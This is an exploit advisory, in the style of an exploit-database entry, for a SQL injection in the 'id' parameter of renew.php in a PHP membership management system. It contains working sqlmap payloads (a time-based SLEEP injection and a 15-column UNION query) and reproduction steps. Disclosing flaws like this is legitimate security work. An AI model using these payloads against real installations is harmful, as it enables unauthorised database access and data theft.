# Exploit Title: Membership Management System – SQL Injection in renew.php (`http://localhost/codeastro/renew.php?id=1`)

**Date:** 2025-08-11  
**Exploit Author:** Anonymous  
**Vendor Homepage:** https://codeastro.com/  
**Software Link:** https://codeastro.com/membership-management-system-in-php-with-source-code/  
**Version:** 1.0  
**Tested on:** PHP 7.4 on Ubuntu 20.04  

---

## Summary

A SQL Injection vulnerability exists in the `renew.php` endpoint of **Membership Management System**. Unsanitized user input in the specified parameter is interpolated directly into an SQL query, allowing attackers to infer or extract data and, in some cases, execute stacked/time-based payloads.  
**Back-end DBMS (as detected):** MySQL >= 5.0.12 (MariaDB fork)  
**CWE:** CWE-89 (SQL Injection)  
**Severity:** High (placeholder — adjust once CVSS is computed)

## Affected Component & Parameter

### Affected Endpoint

- **URL:** `http://localhost/codeastro/renew.php?id=1`
- **HTTP Method:** GET
- **Vulnerable File:** `renew.php`
- **Parameter:** `id`
- **Vector Location:** GET

### Injection Techniques (as identified by sqlmap)
- **Type:** time-based blind
  - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
  - **Payload:** `id=1 AND (SELECT 1882 FROM (SELECT(SLEEP(5)))AQWw)`
- **Type:** UNION query
  - **Title:** Generic UNION query (NULL) - 15 columns
  - **Payload:** 
```
id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162786a71,0x7a457459725045747a4c755958454c4e595167776e6542666678616a4478427641596e6553624851,0x716a767a71),NULL,NULL,NULL-- -
```



## Proof of Concept (Burp Repeater)

![burp-repeater-poc](poc.png)

## SQLMap Summary

![sqlmap-summary](sqlmap_summary.png)



## Technical Description

The vulnerable parameter is reflected into the SQL statement without proper validation or prepared statements. Boolean-based blind, time-based blind (SLEEP), and/or UNION-based vectors were verified by sqlmap. This enables database enumeration and potential data exfiltration under the privileges of the application’s DB user.

## Impact

- Enumeration of database schemas, tables, and rows  
- Exposure of sensitive user/operational data  
- Potential lateral movement if credentials or session material are stored in DB

## Steps to Reproduce

1. Browse to `http://localhost/codeastro/renew.php?id=1`.  
2. Intercept the request and inject the provided payload(s) into parameter `renew.php?&<param>=...`.  
3. Observe conditional responses / time delays / injected row reflections per technique above.  
4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.

## Vulnerable Code (Screenshot)

![vulnerable-code](code_snippet.png)


References
OWASP: SQL Injection Prevention Cheat Sheet

CWE-89: SQL Injection
